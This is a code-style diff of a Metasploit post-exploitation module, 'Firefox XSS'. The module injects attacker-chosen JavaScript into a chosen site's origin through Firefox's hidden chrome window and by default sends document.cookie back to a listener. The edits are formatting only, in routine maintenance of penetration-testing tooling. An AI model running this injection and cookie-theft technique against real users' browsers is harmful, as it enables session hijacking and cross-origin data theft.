@@ -9,27 +9,30 @@ class MetasploitModule < Msf::Post
   include Msf::Payload::Firefox
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Firefox XSS',
-      'Description'   => %q{
-        This module runs the provided SCRIPT as javascript in the
-        origin of the provided URL. It works by navigating to a hidden
-        ChromeWindow to the URL, then injecting the SCRIPT with Function().
-        The callback "send(result)" is used to send data back to the listener.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev' ],
-      'Platform'      => [ 'firefox' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Firefox XSS',
+        'Description' => %q{
+          This module runs the provided SCRIPT as javascript in the
+          origin of the provided URL. It works by navigating to a hidden
+          ChromeWindow to the URL, then injecting the SCRIPT with Function().
+          The callback "send(result)" is used to send data back to the listener.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'joev' ],
+        'Platform' => [ 'firefox' ]
+      )
+    )
 
     register_options([
-      OptString.new('SCRIPT', [true, "The javascript command to run", 'send(document.cookie)']),
-      OptPath.new('SCRIPTFILE', [false, "The javascript file to run"]),
+      OptString.new('SCRIPT', [true, 'The javascript command to run', 'send(document.cookie)']),
+      OptPath.new('SCRIPTFILE', [false, 'The javascript file to run']),
       OptString.new('URL', [
-        true, "URL to inject into", 'https://metasploit.com'
+        true, 'URL to inject into', 'https://metasploit.com'
       ]),
-      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
+      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])
     ])
   end
 
@@ -38,13 +41,13 @@ class MetasploitModule < Msf::Post
     if results.present?
       print_good results
     else
-      print_error "No response received"
+      print_error 'No response received'
     end
   end
 
   def js_payload
     js = datastore['SCRIPT'].strip
-    %Q|
+    %|
 
       (function(send){
         #{set_timeout_source}
@@ -54,8 +57,8 @@ class MetasploitModule < Msf::Post
                                .hiddenDOMWindow;
 
         hiddenWindow.location = 'about:blank';
-        var src = (#{JSON.unparse({ :src => js })}).src;
-        var key = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
+        var src = (#{JSON.unparse({ src: js })}).src;
+        var key = "#{Rex::Text.rand_text_alphanumeric(rand(8..19))}";
 
         hiddenWindow[key] = true;
         hiddenWindow.location = "#{datastore['URL']}";
